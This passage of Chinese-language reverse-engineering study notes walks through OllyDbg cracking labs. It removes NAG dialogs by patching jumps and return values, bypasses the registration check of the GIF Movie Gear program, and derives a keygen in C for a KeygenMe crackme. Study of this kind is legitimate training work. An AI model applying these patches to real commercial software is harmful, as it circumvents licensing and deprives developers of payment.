DVDMenuS.004DC277\n```\n\n```asm\n004DC277   > \\8BCF          mov ecx,edi                              ;  Default case of switch 004DBDA4\n004DC279   .  E8 51040D00   call DVDMenuS.005AC6CF\n004DC27E   .  8B4D F4       mov ecx,dword ptr ss:[ebp-0xC]\n004DC281   .  5F            pop edi                                  ;  024C8688\n004DC282   .  5E            pop esi                                  ;  024C8688\n004DC283   .  5B            pop ebx                                  ;  024C8688\n004DC284   .  64:890D 00000>mov dword ptr fs:[0],ecx\n004DC28B   .  8BE5          mov esp,ebp\n004DC28D   .  5D            pop ebp                                  ;  024C8688\n004DC28E   .  C2 0400       retn 0x4\n```\n\n第二次去到父函数\n\n```asm\n004DBDA9   .  75 53         jnz short DVDMenuS.004DBDFE;跳转，eax=7\n```\n\n```asm\n004DBDFE   > \\83F8 07       cmp eax,0x7\n004DBE01   .  0F85 42020000 jnz DVDMenuS.004DC049;不跳转\n...\n004DBE4A   .  83F8 01       cmp eax,0x1\n004DBE4D   . /0F85 54010000 jnz DVDMenuS.004DBFA7;跳转，eax=0\n```\n\n```asm\n004DBFA7   > \\8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  DVDMenuS.006508B0\n...\n004DC015   .  E8 16CFFAFF   call DVDMenuS.00488F30;运行到这里卡住，原来是有弹窗\n```\n\n{% asset_img 实验12.5.png 实验12.5 %}\n\n关闭弹窗，执行到下一条指令。F9运行，程序正常使用。\n\n从而我们可知，到NAG窗口不是第二次跳不跳到父函数的问题，关键在于eax的值。eax=2去到NAG窗口，eax=1一直循环，eax=7注册成功。\n\n调用堆栈对程序进行破解和观察，比搜索字符串方式来得高级，养成良好习惯，首先考虑堆栈，迫不得已再搜索字符串。\n\n## 22. 实验十三 ReverseMe.NAGs\n\n{% asset_img 实验13.png 实验13 %}\n\n目标：去掉开始和结束的NAG窗口。\n\n它说点击注册按钮就完成程序的注册，就可以避免结束时弹出的NAG窗口，但开始前的NAG窗口还是在的。所以点击注册也不能达到我们的目标。在help->about要求我们在不使用注册按钮的情况下去掉前后的NAG窗口。\n\n{% asset_img 实验13.1.png 实验13.1 %}\n\n查壳，发现它是由C++编译的32位的可执行文件。\n\n{% asset_img 实验13.2.png 实验13.2 %}\n\nF3载入OD，F9运行，在它弹出第一个NAG窗口后迅速点暂停，查看堆栈。发现有一个“Dialog”字样的函数，对话框，很有可能就是NAG窗口。选中双击“调用来自”那一列，去到汇编代码处下断点。重载运行，指令停在断点处，F8步过，弹出NAG窗口，再F8，NAG窗口消失。可以确定这就是调用第一个NAG窗口处。\n\nF9运行，竟然又回到断点处，F8步过，发现程序界面也是调用这个函数，点击exit后OD执行下条指令。再F9再次回到断点处，F8步过发现结束后的NAG窗口也是调用这个函数。这时再按F9，程序就结束了。\n\n综上所述这个程序共有3个窗口，第1个和第3个是NAG，第2个是程序界面窗口。肯定不能用nop填充，因为主程序也在里面。往上看发现有一个条件跳转，通过验证发现只要在第1次和第3次让它跳转实现就可以绕过NAG窗口。(改ZF验证猜想对错)\n\n```asm\n00420379  |. /74 3F         je short ReverseM.004203BA\n0042037B  |. |8D4C24 4C     lea ecx,dword ptr ss:[esp+0x4C]\n0042037F  |. |89B424 CC3700>mov dword ptr ss:[esp+0x37CC],esi\n00420386  |. |890D F4694400 mov dword ptr ds:[0x4469F4],ecx\n0042038C  |. |8B56 08       mov edx,dword ptr ds:[esi+0x8]\n0042038F  |. |8D4C24 4C     lea ecx,dword ptr ss:[esp+0x4C]\n00420393  |. |899424 A03700>mov dword ptr ss:[esp+0x37A0],edx\n0042039A  |. |E8 C1280100   call <jmp.&MFC42.#CDialog::DoModal_2514>;断点处\n0042039F  |. |8D8424 C83700>lea eax,dword ptr ss:[esp+0x37C8]\n004203A6  |. |8D4C24 20     lea ecx,dword ptr ss:[esp+0x20]\n004203AA  |. |50            push eax\n004203AB  |. |E8 2A270100   call <jmp.&MFC42.#CString::operator=_858>\n004203B0  |. |8B4C24 1C     mov ecx,dword ptr ss:[esp+0x1C]\n004203B4  |. |890D F4694400 mov dword ptr ds:[0x4469F4],ecx\n004203BA  |> \\55            push ebp                                 ; /hMem = 00A00014\n004203BB  |.  FF15 7C804300 call dword ptr ds:[<&KERNEL32.GlobalUnlo>; \\GlobalUnlock\n```\n\n怎么操作？类似于C语言的if语句，如果i==2的话就不跳转，i!=2的话就跳转。只不过是转换成汇编语言来写这个语句。由于我们写入的语句要占很多个字节，不可能直接在je语句里修改，这就要用到inline patch。而jmp语句占5个字节，会把je指令的下一条指令覆盖掉，所以je指令的下一条指令也要写在inline patch里。\n\n那“i”要存到哪里去呢？存到PE结构的数据段里去，因为代码段不允许我们写入。点击M图标，找到00400000地址的那个PE结构，找到.data段双击，在里面找到一大片00的地方，随便找一个字节作为i的存储地址，比如00445ec0。(i的取值为1到3，所以一个字节足够了)\n\n找好了后应该对这个地址进行测试，确定这个地址确实在程序运行过程中没有被使用到。选中00右键->断点->硬件写入->Byte。重载运行，没有停在我们选中的地址处就证实没被使用到。\n\n把反编译窗口的滚动条拉到最下方，在一大片00的地方随便找一处，比如00437d6b，写入if语句的汇编代码。\n\n```asm\n00437D6B      FE05 C05E4400       inc byte ptr ds:[0x445EC0];i+=1\n00437D71      803D C05E4400 02    cmp byte ptr ds:[0x445EC0],0x2;i-2==0?不跳转:跳转\n00437D78    ^ 0F85 3C86FEFF       jnz ReverseM.004203BA\n00437D7E      8D4C24 4C           lea ecx,dword ptr ss:[esp+0x4C];被jmp指令覆盖的指令\n00437D82    ^ E9 F885FEFF         jmp ReverseM.0042037F\n```\n\n```asm\n00420379  |. /74 3F               je short ReverseM.004203BA\n修改为\n00420379     /E9 F27B0100         jmp ReverseM.00437D6B\n```\n\n将所有修改保存，若保存不了试试换写汇编代码的地址。这样就去除完两个NAG窗口了。\n\n## 23. 模态对话框与非模态对话框\n\n对话框就是完成“人机对话”的功能，是程序与用户进行交互的中介，如输入参数、输入文本、退出确认等。\n\n对话框从类型上分为两类：modal对话框和modeless对话框。\n\n它们之间的区别在于是否允许用户在不同窗口间进行切换，模态对话框不允许，而非模态对话框允许。模态对话框由Windows为它内建一个消息循环，而非模态对话框的消息则是通过用户程序中的消息循环派送的。\n\n创建模态对话框是由调用DialogBoxParam函数实现，而非模态对话框调用CreateDialogParam函数实现。\n\n### 23.1 DialogBoxParam函数\n\n```c\nHWND DialogBoxParam(\n    HINSTANCE hInstance,//模板名字，独一无二的数字\n    LPCTSTR IpTemplateName,\n    HWND hWndParent, \n    DLGPROC IPDialogFunc,\n    LPARAM dwlnitParam\n);\n```\n\n### 23.2 CreateDialogParam函数\n\n```c\nHWND CreateDialogParam(\n    HINSTANCE hlnstancem,\n    LPCTSTR IpTemplateName,\n    HWND hWndParent,\n    DLGPROCIpDialogFunc, \n    LPARAM dwlniParam\n);\n```\n\n## 24. 实验十四 Urlegal\n\n{% asset_img 实验14.png 实验14 %}\n\n{% asset_img 实验14.1.png 实验14.1 %}\n\n目标：完成注册，去除NAG窗口。\n\n我们知道，只要我们成功注册，NAG窗口也会随之消失。就用以前的方法也可以破解这个软件。这次用另一种方法破解。\n\nNAG其实是个对话框，而且是模态对话框。将程序拖进exescope查看。\n\n{% asset_img 实验14.2.png 实验14.2 %}\n\n在这个程序可以修改对话框的内容，但这个不是实验的重点。可以知道这个对话框的编号是103，也就是`DialogBoxParam`函数的第一个参数，换成16进制是0x67。将Urlegal载入OD，右键->查找->所有命令，输入命令`push 0x67`弹出R图标，显示这个命令的地址。双击进入反汇编窗口。\n\n```asm\n00401220  /$  55            push ebp\n00401221  |.  8BEC          mov ebp,esp\n00401223  |.  6A FF         push -0x1\n00401225  |.  68 05744100   push Urlegal.00417405                      ;  SE 处理程序安装\n0040122A  |.  64:A1 0000000>mov eax,dword ptr fs:[0]\n00401230  |.  50            push eax\n00401231  |.  64:8925 00000>mov dword ptr fs:[0],esp\n00401238  |.  51            push ecx                                   ;  Urlegal.<ModuleEntryPoint>\n00401239  |.  894D F0       mov [local.4],ecx                          ;  Urlegal.<ModuleEntryPoint>\n0040123C  |.  8B45 08       mov eax,[arg.1]\n0040123F  |.  50            push eax\n00401240  |.  6A 67         push 0x67;句柄103\n00401242  |.  8B4D F0       mov ecx,[local.4]\n00401245  |.  E8 6A570100   call <jmp.&MFC42.#CDialog::CDialog_324>;可知这个就是NAG窗口函数\n;因为函数的参数是从后往前进栈，所以第一个参数是最后进栈的，然后才调用函数\n```\n\n这个函数是不希望进去的，但从入口处到函数执行前却没有跳转指令，那要返回到上一层函数看看。\n\n在00401220地址处下断点，重载运行，在主程序窗口点击关闭按钮(因为NAG窗口是在关闭时出现的)，OD停在断点处。在堆栈窗口可以看到\n\n```asm\n0019ED24   004023C0  返回到 Urlegal.004023C0 来自 Urlegal.00401220\n```\n\n选中右键->反汇编窗口中跟随\n\n```asm\n004023AA  |.  E8 691A0000   call Urlegal.00403E18\n004023AF  |.  85C0          test eax,eax\n004023B1  |. /75 43         jnz short Urlegal.004023F6\n004023B3  |. |6A 00         push 0x0\n004023B5  |. |8D8D 98FEFFFF lea ecx,[local.90]\n004023BB  |. |E8 60EEFFFF   call Urlegal.00401220\n004023C0  |. |C745 FC 00000>mov [local.1],0x0\n004023C7  |. |8D8D 98FEFFFF lea ecx,[local.90]\n004023CD  |. |E8 3A450100   call <jmp.&MFC42.#CDialog::DoModal_2514>\n004023D2  |. |83F8 01       cmp eax,0x1\n004023D5  |. |75 0B         jnz short Urlegal.004023E2\n004023D7  |. |8B8D 94FEFFFF mov ecx,[local.91]\n004023DD  |. |E8 82470100   call <jmp.&MFC42.#CFrameWnd::OnClose_4413>\n004023E2  |> |C745 FC FFFFF>mov [local.1],-0x1\n004023E9  |. |8D8D 98FEFFFF lea ecx,[local.90]\n004023EF  |. |E8 3CF0FFFF   call Urlegal.00401430\n004023F4  |. |EB 0B         jmp short Urlegal.00402401\n004023F6  |> \\8B8D 94FEFFFF mov ecx,[local.91]\n```\n\n004023BB的call指令执行的就是那个没有跳转指令的函数。往上找有一个jnz指令，如果不想NAG窗口出现那就必须要让它跳转实现。jnz上面有test指令和call指令，call指令应该执行的是判断程序是否注册的函数，返回值存给eax。\n\n在004023AA处下断点重载运行，点关闭，OD停在断点处，F7进入函数\n\n```asm\n00403E18  /$  55            push ebp\n00403E19  |.  8BEC          mov ebp,esp\n00403E1B  |.  51            push ecx                                   ;  Urlegal.00422428\t;以上不能修改\n00403E1C  |.  894D FC       mov [local.1],ecx                          ;  Urlegal.00422428\n00403E1F  |.  8B45 FC       mov eax,[local.1]\n00403E22  |.  8B40 2C       mov eax,dword ptr ds:[eax+0x2C]\n00403E25  |.  8BE5          mov esp,ebp\t\t;以下不能修改\n00403E27  |.  5D            pop ebp                                    ;  Urlegal.004023AF\n00403E28  \\.  C3            retn\n```\n\n这个判断过程非常短，很容易看明白。只要将eax修改为1即可。由于`mov eax,1`占5个字节，能修改的指令一行最多占3个字节，可以用inline patch方式修改，也可以选中`mov eax`的那两条进行修改。\n\n```asm\nmov eax,[local.1]\t\t\t\t\t\t=>\t\tmov eax,1\nmov eax,dword ptr ds:[eax+0x2C]\t\t\t\n```\n\n选中两条右键->汇编，修改指令，保存。\n\n{% asset_img 实验14.3.png 实验14.3 %}\n\n发现“Register”已经变成灰色，关闭也没有NAG窗口。\n\n接下来尝试用搜索字符串方式破解。\n\n{% asset_img 实验14.4.png 实验14.4 %}\n\n右键->中文搜索引擎->智能搜索图上字符串，看到关键字符串“Thank you for registering!”，双击进入反汇编窗口。往上找跳转指令\n\n```asm\n00402648  |.  E8 C3050000   call Urlegal.00402C10\t\t\t\t\t  ;  很有可能是关键函数\n0040264D  |.  85C0          test eax,eax                              ;  msctf.779D27BC\n0040264F  |.  75 76         jnz short Urlegal.004026C7\n00402651  |.  8D55 EC       lea edx,[local.5]\n00402654  |.  52            push edx\n00402655  |.  8D45 88       lea eax,[local.30]\n00402658  |.  50            push eax                                  ;  msctf.779D27BC\n00402659  |.  E8 02060000   call Urlegal.00402C60                     ;  很有可能是关键函数\n0040265E  |.  25 FF000000   and eax,0xFF\n00402663  |.  85C0          test eax,eax                              ;  msctf.779D27BC\n00402665  |.  74 60         je short Urlegal.004026C7\n```\n\n004026C7地址是注册失败的地址，这两条跳转指令都会去到注册失败的地方，先看第一个函数，当我们输入注册序列号后，F8往下，发现jnz不跳转，说明第一个函数其实不是关键函数。再F8，发现je跳转，修改ZF，弹窗注册成功，注册也变成了灰色，说明破解成功，也就说明第二个函数是关键函数。尝试用nop修改je指令，可以正常执行。\n\n用这种方法不好的就是每次打开软件都要进行注册。再仔细想想，如果我们是已注册用户，程序就不会进到注册窗口，所以我们要找到这个函数的父函数，让它跳过注册函数。呃啊...没找到...\n\n## 25. 实验十五 movgear\n\n{% asset_img 实验15.png 实验15 %}\n\n目标：去除关闭后的NAG窗口。\n\n与实验十四的实验步骤一样，Resource Hacker跟eyescope实现的功能差不多。\n\n{% asset_img 实验15.1.png 实验15.1 %}\n\n知道对话框的编号为100，16进制为0x64，寻找`push 0x64`时却发现不止一个地址，右键->在每个命令上设置断点。重载运行，点关闭时停下的断点才是我们要找的。\n\n```asm\n00406707   > \\6A 00         push 0x0\n00406709   .  6A 00         push 0x0\n0040670B   .  E8 30AF0200   call movgear.00431640\n00406710   .  83C4 08       add esp,0x8\n00406713   .  83F8 01       cmp eax,0x1\n00406716   .  74 16         je short movgear.0040672E\n00406718   .  A1 68854600   mov eax,dword ptr ds:[0x468568]\n0040671D   .  6A 01         push 0x1                                 ; /lParam = 00000001\n0040671F   .  68 D0E84000   push movgear.0040E8D0                    ; |DlgProc = movgear.0040E8D0\n00406724   .  56            push esi                                 ; |hOwner = 00110402 ('GIF Movie Gear',class='GIF Movie Gear')\n00406725   .  6A 64         push 0x64                                ; |pTemplate = 0x64\n00406727   .  50            push eax                                 ; |hInst = 00400000\n00406728   .  FF15 0C834400 call dword ptr ds:[<&USER32.DialogBoxPar>; \\DialogBoxParamA\n0040672E   >  8B8C24 B80000>mov ecx,dword ptr ss:[esp+0xB8]\n```\n\n往上看跳转和call指令，在0040670B处下断点，步入。粗略看下函数，只有一个返回的地方。\n\n```asm\n0043173E  |.  8BC3          mov eax,ebx                              ;  movgear.00406170\n00431740  |.  5E            pop esi                                  ;  movgear.00406710\n00431741  |.  5B            pop ebx                                  ;  movgear.00406710\n00431742  |.  81C4 D0000000 add esp,0xD0\n00431748  \\.  C3            retn\n```\n\n可知eax的值是ebx赋给它的，往上找ebx只找到一处。\n\n```asm\n004316C7  |.  51            push ecx                                 ;  movgear.00406170\n004316C8  |.  52            push edx\n004316C9  |.  E8 B2FEFFFF   call movgear.00431580;验证函数\n004316CE  |.  83C4 08       add esp,0x8\n004316D1  |.  85C0          test eax,eax\n004316D3  |.  74 5D         je short movgear.00431732\n004316D5  |.  8B9424 E00000>mov edx,dword ptr ss:[esp+0xE0]          ;  user32.758C67DC\n004316DC  |.  BB 01000000   mov ebx,0x1\n```\n\nje不能跳转，一跳转就不能让ebx=1了，所以可以猜测je上面的call指令就是调用验证是否注册的函数。在004316C9下断点，发现没经过就直接弹窗了。从函数开头下断点，F8一步步走。\n\n```asm\n00431697  |.  85C0          test eax,eax\n00431699  |.  0F85 93000000 jnz movgear.00431732\n```\n\n发现00431699跳转直接跳过了验证函数。走到`mov ebx,0x1`好像挺多要改的，那就不去了，直接在退出函数前改eax的值。因为只有两个字节可以修改，而`mov eax,1`占5个字节，那就修改al的值，因为返回值准确来说是存放在al中。\n\n```asm\n0043173E  |.  8BC3          mov eax,ebx \t=>\t\tmov al,1\n```\n\n也可以从几个常用的函数推测004316C9是验证函数地址。\n\n### 25.1 RegOpenKeyEx\n\n函数功能：用于打开一个指定的注册表键。\n\n注册表可以理解为Windows数据库，Windows通过注册表写入软件的版本信息，运行状态等。\n\n```c\nLONG RegOpenKeyEx(\n    HKEY hKey, // 需要打开的主键的名称\n    LPCTSTR lpSubKey, //需要打开的子键的名称\n    DWORD ulOptions, // 保留，设为0\n    REGSAM samDesired, // 安全访问标记，也就是权限\n    PHKEY phkResult // 得到的将要打开键的句柄\n);\n```\n\n### 25.2 RegQueryValueEx\n\n函数功能：检索一个已打开的注册表句柄中，指定的注册表键的类型和设置值。\n\n这个函数是从注册表里取出数据，传到lpdata里去。\n\n```c\nLONG WINAPI RegQueryValueEx(\n    HKEY hKey,            // handle to key\n    LPCTSTR lpValueName,  // value name\n    LPDWORD lpReserved,   // reserved\n    LPDWORD lpType,       // type buffer\n    LPBYTE lpData,        // data buffer\n    LPDWORD lpcbData      // size of data buffer\n);\n```\n\n### 25.3 RegCloseKey\n\n函数功能：释放指定注册键的句柄。\n\n```c\nLONG RegCloseKey(\n\tHKEY hKey // 释放键的句柄\n);\n```\n\n在0040670B处进入函数\n\n```asm\n0043164D  |.  50            push eax                                 ; /pHandle = NULL\n0043164E  |.  68 19000200   push 0x20019                             ; |Access = KEY_READ\n00431653  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00431655  |.  68 F8B34400   push movgear.0044B3F8                    ; |Subkey = \"Software\\gamani\\GIFMovieGear\\2.0\"\n0043165A  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER\n0043165F  |.  83CB FF       or ebx,-0x1                              ; |\n00431662  |.  FF15 00804400 call dword ptr ds:[<&ADVAPI32.RegOpenKey>; \\RegOpenKeyExA\n00431668  |.  85C0          test eax,eax\n0043166A  |.  0F85 C2000000 jnz movgear.00431732\n00431670  |.  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n00431674  |.  8B35 04804400 mov esi,dword ptr ds:[<&ADVAPI32.RegQuer>;  apphelp.6CB30350\n0043167A  |.  8D5424 14     lea edx,dword ptr ss:[esp+0x14]\n0043167E  |.  51            push ecx                                 ; /pBufSize = movgear.00406170\n0043167F  |.  52            push edx                                 ; |Buffer = NULL\t\t;lpData,edx=esp+0x14,存的是注册名\n00431680  |.  50            push eax                                 ; |pValueType = NULL\n00431681  |.  50            push eax                                 ; |Reserved = NULL\n00431682  |.  8B4424 1C     mov eax,dword ptr ss:[esp+0x1C]          ; |\n00431686  |.  BF 64000000   mov edi,0x64                             ; |\n0043168B  |.  68 98D44400   push movgear.0044D498                    ; |ValueName = \"RegName3\"\n00431690  |.  50            push eax                                 ; |hKey = 0x0\t\t\t;6个push传入API函数的6个参数\n00431691  |.  897C24 28     mov dword ptr ss:[esp+0x28],edi          ; |\n00431695  |.  FFD6          call esi                                 ; \\RegQueryValueExA\n00431697  |.  85C0          test eax,eax\n00431699      0F85 93000000 jnz movgear.00431732\n0043169F  |.  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n004316A3  |.  8D5424 78     lea edx,dword ptr ss:[esp+0x78]\n004316A7  |.  51            push ecx                                 ; /pBufSize = movgear.00406170\n004316A8  |.  52            push edx                                 ; |Buffer = NULL\t;lpData,edx=esp+0x78,存的是密码\n004316A9  |.  50            push eax                                 ; |pValueType = NULL\n004316AA  |.  50            push eax                                 ; |Reserved = NULL\n004316AB  |.  8B4424 1C     mov eax,dword ptr ss:[esp+0x1C]          ; |\n004316AF  |.  68 A4D44400   push movgear.0044D4A4                    ; |ValueName = \"RegCode3\"\n004316B4  |.  50            push eax                                 ; |hKey = 0x0\t\t\n004316B5  |.  897C24 28     mov dword ptr ss:[esp+0x28],edi          ; |\n004316B9  |.  FFD6          call esi                                 ; \\RegQueryValueExA\n004316BB  |.  85C0          test eax,eax\n004316BD  |.  75 73         jnz short movgear.00431732\n004316BF  |.  8D4C24 78     lea ecx,dword ptr ss:[esp+0x78];密码\n004316C3  |.  8D5424 14     lea edx,dword ptr ss:[esp+0x14];注册名\n004316C7  |.  51            push ecx                                 ;  movgear.00406170\n004316C8  |.  52            push edx\n004316C9  |.  E8 B2FEFFFF   call movgear.00431580\n;将注册名和密码进栈，所以这个函数肯定是验证函数\n```\n\n## 26. Keygen(注册机)\n\nKey Generator，是软件注册生成所需的注册码或序列号的程序。Keygen可独立作为一个可执行程序存在，也可以作为程序的一个模块实现。主要功能是利用已经安排好的算法计算出独一无二的序列号(注册码)等。\n\n## 27. 实验十六 KeygenMe\n\n{% asset_img 实验16.png 实验16 %}\n\n目标：逆向算法破解注册机。\n\n程序是一个对话框获取字符串，可以在command里输入`bp GetDlgItemTextA`或Ctrl+G查找API函数下断点，断在了DLL领空。F9运行，输入字符串，停在断点处，因为在DLL领空，我们不能做任何修改。一路F8走到返回指令，或Alt+F9返回到用户代码，再或在堆栈窗口右键->反汇编窗口中跟随，都可以到达父函数。\n\n```asm\n004012B1  |.  6A 1A         push 0x1A                                ; /Count = 1A (26.)\n004012B3  |.  68 38304000   push KeygenMe.00403038                   ; |Buffer = KeygenMe.00403038\n004012B8  |.  6A 6A         push 0x6A                                ; |ControlID = 6A (106.)\n004012BA  |.  FF75 08       push [arg.1]                             ; |hWnd = 000905F0 (' Tut selfkeygenMe ',class='lena151')\n004012BD  |.  E8 08010000   call <jmp.&USER32.GetDlgItemTextA>       ; \\GetDlgItemTextA\n004012C2  |.  83F8 00       cmp eax,0x0\n004012C5  |.  74 18         je short KeygenMe.004012DF\n004012C7  |.  6A 1A         push 0x1A                                ; /Count = 1A (26.)\n004012C9  |.  68 38314000   push KeygenMe.00403138                   ; |Buffer = KeygenMe.00403138\n004012CE  |.  6A 6B         push 0x6B                                ; |ControlID = 6B (107.)\n004012D0  |.  FF75 08       push [arg.1]                             ; |hWnd = 000905F0 (' Tut selfkeygenMe ',class='lena151')\n004012D3  |.  E8 F2000000   call <jmp.&USER32.GetDlgItemTextA>       ; \\GetDlgItemTextA\n004012D8  |.  83F8 00       cmp eax,0x0\n004012DB  |.  74 02         je short KeygenMe.004012DF\n004012DD  |.  EB 17         jmp short KeygenMe.004012F6\n004012DF  |>  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n004012E1  |.  68 62344000   push KeygenMe.00403462                   ; |Title = \"KeyGen lena151   \"\n004012E6  |.  68 00304000   push KeygenMe.00403000                   ; |Text = \"    Give me more material hehe!!\"\n004012EB  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n004012ED  |.  E8 FC000000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n004012F2  |.  C9            leave\n004012F3  |.  C2 1000       retn 0x10\n```\n\n刚才是进入了004012BD地址的函数，看到下面还有一个`GetDlgItemTextA`，说明还要进入一次刚才的断点处。结合上面整段代码来看，第一次存入第一个框的内容，第二次存入第二个框的内容，两个`GetDlgItemTextA`下面的je跳转是判断用户是否输入字符串，没有就跳到`MessageBoxA`处。如果两个框都有输入，则跳到下面的代码处。\n\n```asm\n004012F6  |> \\68 38304000   push KeygenMe.00403038                   ; /String = \"\"\t\t将第一个框的内容压栈\n004012FB  |.  E8 30010000   call <jmp.&kernel32.lstrlen>             ; \\lstrlenA\t\t获取字符串长度\n00401300  |.  33F6          xor esi,esi;esi清零\n00401302  |.  8BC8          mov ecx,eax;字符串长度作为循环次数,i\n00401304  |.  B8 01000000   mov eax,0x1;eax=1\n00401309  |>  8B15 38304000 /mov edx,dword ptr ds:[0x403038]\n;第一个字符传给edx\n0040130F  |.  8A90 37304000 |mov dl,byte ptr ds:[eax+0x403037]\n;第一个字符传给dl\n00401315  |.  81E2 FF000000 |and edx,0xFF\n0040131B  |.  8BDA          |mov ebx,edx\n0040131D  |.  0FAFDA        |imul ebx,edx\n00401320  |.  03F3          |add esi,ebx                             ;  KeygenMe.004011E2\n00401322  |.  8BDA          |mov ebx,edx\n00401324  |.  D1FB          |sar ebx,1\n00401326  |.  83C3 03       |add ebx,0x3\n00401329  |.  0FAFDA        |imul ebx,edx\n0040132C  |.  2BDA          |sub ebx,edx\n0040132E  |.  03F3          |add esi,ebx                             ;  KeygenMe.004011E2\n00401330  |.  03F6          |add esi,esi\n00401332  |.  40            |inc eax\t\t;eax++\n00401333  |.  49            |dec ecx        ;i--                     ;  KeygenMe.004011E2\n00401334  |.^ 75 D3         \\jnz short KeygenMe.00401309\n00401336  |.  3B35 38314000 cmp esi,dword ptr ds:[0x403138]\n;匹配第二个框的内容，esi从上面的算法得出，所以第一个框和第二个框其实是有关联的\n;这个是注册机，对它进行爆破没有意义，我们想要的是它得出的序列号\n0040133C  |.  75 15         jnz short KeygenMe.00401353\n0040133E  |.  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401340  |.  68 62344000   push KeygenMe.00403462                   ; |Title = \"KeyGen lena151   \"\n00401345  |.  68 B8344000   push KeygenMe.004034B8                   ; |Text = \" That's right. (Self)keygen me now!\"\n0040134A  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n0040134C  |.  E8 9D000000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401351  |. /EB 13         jmp short KeygenMe.00401366\n00401353  |> |6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401355  |. |68 62344000   push KeygenMe.00403462                   ; |Title = \"KeyGen lena151   \"\n0040135A  |. |68 86344000   push KeygenMe.00403486                   ; |Text = \" Error detected! Remove debugger from Hard Drive \"\n0040135F  |. |6A 00         push 0x0                                 ; |hOwner = NULL\n00401361  |. |E8 88000000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401366  |> \\EB 15         jmp short KeygenMe.0040137D\n00401368  |>  FF75 14       push [arg.4]                             ; /lParam = 0x20582\n0040136B  |.  FF75 10       push [arg.3]                             ; |wParam = 6C (108.)\n0040136E  |.  FF75 0C       push [arg.2]                             ; |Message = WM_COMMAND\n00401371  |.  FF75 08       push [arg.1]                             ; |hWnd = 000D0262 (' Tut selfkeygenMe ',class='lena151')\n00401374  |.  E8 3F000000   call <jmp.&USER32.DefWindowProcA>        ; \\DefWindowProcA\n00401379  |.  C9            leave\n0040137A  |.  C2 1000       retn 0x10\n0040137D  |>  33C0          xor eax,eax\n0040137F  |.  C9            leave\n00401380  \\.  C2 1000       retn 0x10\n```\n\n方法一：用Inline patch将算出来的序列号存入数据段，把数据压入提示错误的MessageBoxA，因为我们输入的序列号肯定是错误的，弹框出来肯定是提示错误的弹窗，这样我们压入的数据就可以显示出来。\n\n在数据窗口看到一堆的00，选中一个右键->断点->硬件写入->Dword，比如439000地址。也可以点击M图标在数据段找空白处。重载运行一下确保这个地址没有被使用。\n\n在反汇编窗口找空白代码处，比如40138D。编写汇编代码\n\n```asm\nmov dword ptr [439000],esi\njmp 401353\n```\n\n在0040133C处修改代码\n\n```asm\njnz short KeygenMe.00401353\t\t=>\t\tjmp 40138D\n```\n\n在0040135A处修改代码\n\n```asm\npush KeygenMe.00403486\t\t=>\t\tpush 439000\n```\n\n保存文件，运行，序列号竟然是乱码。\n\n{% asset_img 实验16.1.png 实验16.1 %}\n\n载入OD查看439000地址的HEX数据是3b92d6，也就是上面乱码字符的ASCII码的16进制形式，也可以看esi也是3b92d6。\n\n```asm\n00439000  D6 92 3B 00                                        謷;\n```\n\n弹窗复制不了，只能复制OD里面的了！回到原始程序，注册成功。\n\n{% asset_img 实验16.2.png 实验16.2 %}\n\n方法二：逆向算法\n\n```asm\n004012F6  |> \\68 38304000   push KeygenMe.00403038                   ; /String = \"v5le0n9\"\t\t将第一个框的内容压栈\n004012FB  |.  E8 30010000   call <jmp.&kernel32.lstrlen>             ; \\lstrlenA\t\t获取字符串长度\n00401300  |.  33F6          xor esi,esi;esi清零\n00401302  |.  8BC8          mov ecx,eax;字符串长度作为循环次数,i=7\n00401304  |.  B8 01000000   mov eax,0x1;eax=1\n00401309  |>  8B15 38304000 /mov edx,dword ptr ds:[0x403038]\n;edx=656c3576,0x76=v,0x35=5,0x6c=l,0x65=e\n0040130F  |.  8A90 37304000 |mov dl,byte ptr ds:[eax+0x403037]\n;dl=0x76=v\n00401315  |.  81E2 FF000000 |and edx,0xFF\n;给edx的高24位清零，edx=00000076\n0040131B  |.  8BDA          |mov ebx,edx\n;ebx=edx=00000076\n0040131D  |.  0FAFDA        |imul ebx,edx\n;ebx*=edx='v'*'v'\n00401320  |.  03F3          |add esi,ebx                             ;  KeygenMe.004011E2\t\tesi+=ebx,即esi='v'*'v'\n00401322  |.  8BDA          |mov ebx,edx\n;ebx=edx=0x76\n00401324  |.  D1FB          |sar ebx,1\n;右移一位，相当于除以2，ebx=ebx/2='v'/2\n00401326  |.  83C3 03       |add ebx,0x3\n;ebx+=3,ebx='v'/2+3\n00401329  |.  0FAFDA        |imul ebx,edx\n;ebx=ebx*edx=('v'/2+3)*'v'\n0040132C  |.  2BDA          |sub ebx,edx\n;ebx=ebx-edx=('v'/2+3)*'v'-'v'\n0040132E  |.  03F3          |add esi,ebx; KeygenMe.004011E2\n;esi+=('v'/2+3)*'v'-'v',esi='v'*'v'+('v'/2+3)*'v'-'v'\n00401330  |.  03F6          |add esi,esi;esi=esi*2\n00401332  |.  40            |inc eax\t\t;eax++\n00401333  |.  49            |dec ecx        ;i--                     ;  KeygenMe.004011E2\n00401334  |.^ 75 D3         \\jnz short KeygenMe.00401309\n```\n\nexp\n\n```c\n#include<stdio.h>\nint main()\n{\n    char name[]=\"v5le0n9\";\n    int i;\n    int result=0;\n    for(i=0; i<7; i++)\n    {\n        result += name[i]*name[i]+(name[i]/2+3)*name[i]-name[i];\n\t\tresult += result;       \n    }\n    printf(\"%d\",result);\n}\n//3904214=0x3b92d6\n```\n\n用工具转换不了字符串的话，就直接在数据窗口一段00处打16进制，ASCII码窗口就会显示你所要的字符串。\n\n## 28. 多态和变形\n\n### 28.1 